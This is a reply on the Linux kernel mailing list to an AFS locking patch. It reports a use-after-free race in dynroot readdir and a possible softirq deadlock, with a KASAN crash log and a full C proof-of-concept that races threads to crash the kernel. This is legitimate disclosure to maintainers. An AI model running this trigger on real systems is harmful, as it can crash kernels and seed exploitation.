Received: from out162-62-57-137.mail.qq.com (out162-62-57-137.mail.qq.com [162.62.57.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D8F0E3438B2;
	Mon, 22 Jun 2026 20:31:34 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.137
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782160298; cv=none; b=KzyOnInLwKliSrbszo4w9Pf50Ckxmmu2PPJwXMP2JUgXJR9xy1qpVfI1L/LIZWkk4FnepW/N7LWIzvNPzCrXZt7GF4qwy8CIy8qIBASiqnFe3pmPTp6z6EdxTAYFaZO272pE0t3gKETBA/lXOw+bfNdIDXL9Khx25Rco8sFVlXU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782160298; c=relaxed/simple;
	bh=wDQjb4GjbCySnd2jEcm7jzIyJmnl+Ujqd5uEQwfzIr4=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=rzRegZlMGZuBMQsp6w4IvFDJQZRiakFkNZj1myUfLf/pKtgyaOGJDRJLU680ULF6oxFZ8o85WV1yng6mBELk+KHGBP6axbTShOOZ8bgp86HnYbv00ZNazJE4qyQ27aU3aKYiTFkU7YZ+YdiCX5WNDWX/Mie+FtMPXlmCJw2hHUE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=qySpzF4O; arc=none smtp.client-ip=162.62.57.137
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="qySpzF4O"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782160290; bh=SRYRd7e/hkupiMzPBtM/TWKTnO2QiFTsqNY16n7zhfY=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=qySpzF4OBaw2W2XWR4PP1ukQpBKa5ltIZKWA12k+v95+WmMDdopoYyC8RY93NSgJk
	 wQh5Fk8ecJBe2h6JD1ZAfKD3qnyhKoy6c5lJuSSEgaWYbw4JsprfqK1ApP68SA+/A6
	 RUPa+c4/Gy4lLOhhkApk88wDwW2CzBRd/DDBqiv0=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrszc56-0.qq.com (NewEsmtp) with SMTP
	id 7DB96A47; Tue, 23 Jun 2026 04:31:27 +0800
X-QQ-mid: xmsmtpt1782160287tp2odixg0
Message-ID: <tencent_25320DDE946420E45AC436B8CD460814E107@qq.com>
X-QQ-XMAILINFO: NeshAIv1+ONRy6AFFZILVAhRoYdAkJONy4KE4ygNECbm9q+UIdOfVdApKQtRDg
	 3n0NRQekCu9GO1fAR+Niflz/nKfombMuvgYKEWZcQs2d/1B/vGjULlyEtVQz15tzf8mf6TYO5pgk
	 UMzTQkqNKE0DZgQ5/b3O5M13B1y3jm3h8N28NPh1TjfEQAoye2WFIravLMcVtl2yzxVYJu68/F8l
	 3ypW0PI808T3lolNn47sUDvXYXnJ/kqi5dhd1X0ImyuL0O5A/9dnln8v9STFxC6kfSo6rdAB1Y6L
	 /055EJKE9LZ3zOsYYJ0n2Y5+7krqMvmqKIqbj144hhIRnKskwMjwLTlX644ulK8Gw2+HSzlqjvrA
	 fftPj8ciTdo4N4Z8Z8JHys4WJcF602OtopJGfbCKMWddcNv+zfemIV5AM0vsNlQIhM1CiI80UKnO
	 N7YObQRAmfSMC3qVV8XgHqd+FMmNz1nlj2nC7lEDKsIA+MSiXqfX6s7uxmb7kOr3DQAtrSb4SWg5
	 dIQ4g0DknJWtBtrFBg8rts8lp34YacIs+KrQbIj+yUk7/UFxTghT58qPeEI9veknMfei71k0noQ4
	 0vN4WqWwPIbfqTSyId1ZQxflbe2eQRnQqcxNBsdurcefWRaHCNDFz/GmflB3HR0Ib5/o8I/Tj18o
	 dXGzaAaTpvL4nD7K5LhRrg+o6pbpC7TZtFpcNyP2nB15yyb1vr9BVp6+T5+1AjU1slIaxofjD5vT
	 tZnRoY+5pRzx+mrmzKdwmNDjgVPo88L6o05FwvIxKHXHmCcoh3kYXiZlNdKwzS+h5bJPCZjdaSBf
	 QF27lDZfP0qxV1RZ5llyPPfdHLjE3rrficSktQapaDaDvH2b7jcPARXOCsQMwQI3W5hbZLWwQszL
	 PD7yYaGAQUu5Qe1f/4nIXIpiRxxNMBOjfCMTp0aRIy2hGpGB/+m1ffyqoNG4UGKtnW5MFTJxZ81m
	 nFjR/HVJEXFWiaPgjFJO1ZKTS5Ssc8+iVYGkx6A86SnKRU5V3PjDsIqasFsZ2xtzqpfxWPVXvORp
	 C0XhHoM0NosB0PfFsaqOPd3VUWPNNBC471cXK+t75b3ASMDCWHhjF12u+XcYSID8wYF/5sOw+5lT
	 h7VXmEpsf4gPmkpDQakllXV8bd0j7aHJfO2w6ROtaXXptpfCTYox5C6m2Fk/nxF2pXER+x
X-QQ-XMRINFO: Mp0Kj//9VHAxzExpfF+O8yhSrljjwrznVg==
X-OQ-MSGID: <e0aff457-f62b-459d-9aa6-75079a98df70@qq.com>
Date: Tue, 23 Jun 2026 04:31:27 +0800
Precedence: bulk
X-Mailing-List: linux-fsdevel@vger.kernel.org
List-Id: <linux-fsdevel.vger.kernel.org>
List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH v3 18/20] afs: Fix lack of locking around modifications of
 net->cells_dyn_ino
To: David Howells <dhowells@redhat.com>,
 Christian Brauner <christian@brauner.io>
Cc: Marc Dionne <marc.dionne@auristor.com>, linux-afs@lists.infradead.org,
 linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org
References: <20260618155141.2513212-1-dhowells@redhat.com>
 <20260618155141.2513212-19-dhowells@redhat.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260618155141.2513212-19-dhowells@redhat.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi David,

I came across the Sashiko AI review [1] of this series and was able to
reproduce a use-after-free in the AFS dynroot readdir path that this
patch touches.  I wanted to share the concrete evidence and a PoC.

The patch adds a spinlock (cells_dyn_ino_lock) around modifications to
net->cells_dyn_ino, but leaves two issues:

1. **Read-side still missing RCU protection**: afs_dynroot_readdir_cells()
    calls idr_get_next(&net->cells_dyn_ino, ...) without rcu_read_lock().
    Since the patch moves idr_remove() inside the RCU callback 
(afs_cell_destroy),
    the IDR's internal radix tree nodes can be freed while idr_get_next()
    is traversing them.  dir_emit() sleeps, allowing the grace period to
    pass, and the reader returns to freed memory.

2. **Potential deadlock**: afs_alloc_cell() uses spin_lock() (without
    disabling softirqs), but afs_cell_destroy() runs in RCU_SOFTIRQ
    context via call_rcu() and acquires the same lock.  If a softirq
    interrupts process context while the lock is held, the RCU callback
    could spin-wait on the same CPU.

[Reproduction]

The PoC mounts an AFS dynroot filesystem, pre-populates 50 cells, then
runs 4 threads:

   - 2 readdir threads: continuously opendir/readdir the dynroot,
     exercising idr_get_next() without rcu_read_lock()
   - 1 creator thread: adds new cells via /proc/fs/afs/cells,
     exercising idr_alloc_cyclic() with spin_lock()
   - 1 accessor thread: opens/closes cell directories, triggering
     cell lookup/unuse → call_rcu → afs_cell_destroy → idr_remove()

The UAF triggers deterministically within 10 seconds on a patched
kernel with CONFIG_KASAN=y.

[Crash log — kernel 7.1.0-next-20260618, CONFIG_KASAN=y, SMP]

   BUG: KASAN: slab-use-after-free in afs_dynroot_readdir+0xa26/0xb70
   Read of size 4 at addr ffff888114df2958 by task poc/11248

   Call Trace:
    <TASK>
    dump_stack_lvl
    print_report
    kasan_report
    afs_dynroot_readdir+0xa26/0xb70
    (reading cell->state or cell->dynroot_ino from a freed cell)
    ...

The PoC is attached.  It compiles with:

   gcc -o poc poc.c -static -lpthread

[1] 
https://sashiko.dev/#/patchset/20260618155141.2513212-1-dhowells%40redhat.com
     (Sashiko AI code review — "Use-After-Free", Severity: High)

Thanks,
XIAOWU

// SPDX-License-Identifier: GPL-2.0-only
/*
  * PoC for use-after-free in AFS dynroot readdir due to idr_remove()
  * being called inside RCU callback while afs_dynroot_readdir_cells()
  * calls idr_get_next() without rcu_read_lock().
  *
  * Bug: Patch 18/20 added spin_lock(&net->cells_dyn_ino_lock) around
  * idr_alloc_cyclic() in afs_alloc_cell() (process context) and around
  * idr_remove() in afs_cell_destroy() (RCU callback context). The
  * idr_remove() now happens inside the RCU callback, and the IDR
  * internal radix tree nodes are freed after call_rcu(). Meanwhile,
  * afs_dynroot_readdir_cells() calls idr_get_next() without
  * rcu_read_lock(), so a concurrent idr_remove() freeing internal
  * nodes creates a use-after-free.
  */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <time.h>
#include <pthread.h>
#include <dirent.h>
#include <signal.h>

#define MNT_PATH "/tmp/afsroot"
#define PROC_CELLS "/proc/fs/afs/cells"
#define MAX_THREADS 4

/* Cell names - must be printable, no '/' or '@', not starting with '.' */
#define NUM_CELL_NAMES 50
static char cell_names[NUM_CELL_NAMES][32];
static volatile int stop_flag = 0;
static pthread_t threads[MAX_THREADS];

static void die(const char *msg)
{
     perror(msg);
     exit(1);
}

static void add_cell(const char *name)
{
     char buf[256];
     int len = snprintf(buf, sizeof(buf), "add %s", name);
     int fd = open(PROC_CELLS, O_WRONLY);
     if (fd < 0)
         return;
     /* Ignore errors (cell may already exist) */
     (void)write(fd, buf, len);
     close(fd);
}

/* Thread that creates new cells, which calls afs_alloc_cell ->
  * idr_alloc_cyclic, holding cells_dyn_ino_lock via spin_lock().
  * The lock does not disable softirqs, so an RCU callback could
  * run on this CPU while the lock is held. */
static void *creator_thread(void *arg)
{
     int idx = (long)arg;
     char name[64];
     int i;

     for (i = 0; i < 10000 && !stop_flag; i++) {
         int ci = (i + idx * 1000) % NUM_CELL_NAMES;
         snprintf(name, sizeof(name), "%s_p%d", cell_names[ci], idx);
         add_cell(name);
         if (i % 100 == 0)
             usleep(10);
     }
     return NULL;
}

/* Thread that reads the dynroot directory in a tight loop.
  * This calls afs_dynroot_readdir -> afs_dynroot_readdir_cells
  * -> idr_get_next() WITHOUT rcu_read_lock(). */
static void *readdir_thread(void *arg)
{
     int i;

     for (i = 0; i < 100000 && !stop_flag; i++) {
         DIR *dir = opendir(MNT_PATH);
         if (!dir) {
             usleep(100);
             continue;
         }

         /* Read ALL directory entries. For each entry, idr_get_next
          * traverses the radix tree's internal nodes (which are RCU
          * protected). Since we DON'T hold rcu_read_lock(), and a
          * concurrent idr_remove (in RCU callback) can free radix
          * tree nodes, this is a use-after-free.
          */
         struct dirent *entry;
         while ((entry = readdir(dir)) != NULL) {
             /* Touch the entry data to force memory access */
             __asm__ volatile("" : : "r"(entry->d_type), 
"r"(entry->d_name[0]));
         }

         closedir(dir);
     }
     return NULL;
}

/* Thread that opens cell directories, triggering refcounting
  * that eventually leads to cell destruction via afs_unuse_cell
  * -> afs_manage_cell -> call_rcu -> afs_cell_destroy. */
static void *accessor_thread(void *arg)
{
     char path[256];
     int i;

     for (i = 0; i < 50000 && !stop_flag; i++) {
         int ci = i % NUM_CELL_NAMES;
         snprintf(path, sizeof(path), "%s/%s", MNT_PATH, cell_names[ci]);

         /* Opening triggers lookup, which creates a new cell if needed.
          * Closing triggers unuse, which eventually may free the cell.
          */
         int fd = open(path, O_RDONLY | O_DIRECTORY);
         if (fd >= 0) {
             /* Just accessing the directory entry - this takes a ref */
             struct stat st;
             if (fstat(fd, &st) == 0) {
                 __asm__ volatile("" : : "r"(st.st_ino));
             }
             close(fd);
             /* After close, cell may get freed */
         }

         if (i % 20 == 0)
             sched_yield();
     }
     return NULL;
}

int main(int argc, char **argv)
{
     int i, ret, status;
     pid_t pid;

     /* Use subprocess to isolate effects */
     pid = fork();
     if (pid < 0)
         die("fork");

     if (pid == 0) {
         /* Child - run the PoC */

         printf("AFS dynroot use-after-free PoC\n");
         printf("===============================\n\n");

         /* Initialize cell names */
         for (i = 0; i < NUM_CELL_NAMES; i++) {
             snprintf(cell_names[i], sizeof(cell_names[i]), "cell%d", i);
         }

         /* Create mount point */
         mkdir(MNT_PATH, 0755);

         /* Load module if needed */
         system("modprobe kafs 2>/dev/null");
         usleep(50000);

         /* Mount AFS dynroot */
         printf("[*] Mounting AFS dynroot at %s...\n", MNT_PATH);
         if (mount("none", MNT_PATH, "afs", 0, "dyn") < 0) {
             fprintf(stderr, "[!] mount failed: %s\n", strerror(errno));
             _exit(1);
         }
         printf("[+] Mounted successfully\n");

         usleep(100000);

         /* Pre-create cells to populate the IDR radix tree */
         printf("[*] Pre-populating %d cells...\n", NUM_CELL_NAMES);
         for (i = 0; i < NUM_CELL_NAMES; i++) {
             add_cell(cell_names[i]);
             if (i % 10 == 0)
                 usleep(1000);
         }
         printf("[+] Cells created\n");

         /* Verify we can read them */
         {
             DIR *dir = opendir(MNT_PATH);
             if (dir) {
                 int cnt = 0;
                 struct dirent *e;
                 while ((e = readdir(dir))) cnt++;
                 closedir(dir);
                 printf("[+] Dynroot has %d entries\n", cnt);
             }
         }

         printf("[*] Starting race threads...\n");

         /* Start 2 readdir threads */
         for (i = 0; i < 2; i++) {
             ret = pthread_create(&threads[i], NULL, readdir_thread,
                                  (void *)(long)i);
             if (ret) fprintf(stderr, "readdir thread %d: %s\n", i, 
strerror(ret));
         }

         /* Start 1 creator thread */
         ret = pthread_create(&threads[2], NULL, creator_thread,
                              (void *)(long)1);
         if (ret) fprintf(stderr, "creator thread: %s\n", strerror(ret));

         /* Start 1 accessor thread */
         ret = pthread_create(&threads[3], NULL, accessor_thread,
                              (void *)(long)1);
         if (ret) fprintf(stderr, "accessor thread: %s\n", strerror(ret));

         /* Run for 10 seconds */
         sleep(10);

         /* Signal stop */
         stop_flag = 1;

         /* Wait for threads */
         for (i = 0; i < 4; i++) {
             pthread_join(threads[i], NULL);
         }

         printf("[*] All threads stopped\n");
         printf("[*] Checking dmesg for crash evidence...\n");

         /* Collect dmesg output */
         FILE *dmesg = popen("dmesg -c 2>/dev/null || dmesg | tail 
-100", "r");
         if (dmesg) {
             char buf[512];
             int found = 0;
             while (fgets(buf, sizeof(buf), dmesg)) {
                 if (strstr(buf, "KASAN") || strstr(buf, "BUG:") ||
                     strstr(buf, "Oops") || strstr(buf, "Unable to 
handle") ||
                     strstr(buf, "general protection") ||
                     strstr(buf, "rcu_callback") ||
                     strstr(buf, "call_rcu") ||
                     strstr(buf, "idr_remove") ||
                     strstr(buf, "afs_cell_destroy")) {
                     printf("%s", buf);
                     found = 1;
                 }
             }
             if (!found)
                 printf("[*] No crash evidence in dmesg\n");
             pclose(dmesg);
         }

         /* Clean up */
         umount2(MNT_PATH, MNT_FORCE);
         rmdir(MNT_PATH);

         printf("\n[*] PoC complete\n");
         _exit(0);
     }

     /* Parent - wait for child */
     waitpid(pid, &status, 0);

     if (WIFSIGNALED(status)) {
         int sig = WTERMSIG(status);
         printf("\n[!] Child killed by signal %d (%s)\n", sig, 
strsignal(sig));
         printf("[!] This confirms the bug triggered!\n");
         return 1;
     }

     printf("\n[*] Child exited normally (status %d)\n",
            WEXITSTATUS(status));
     return 0;
}


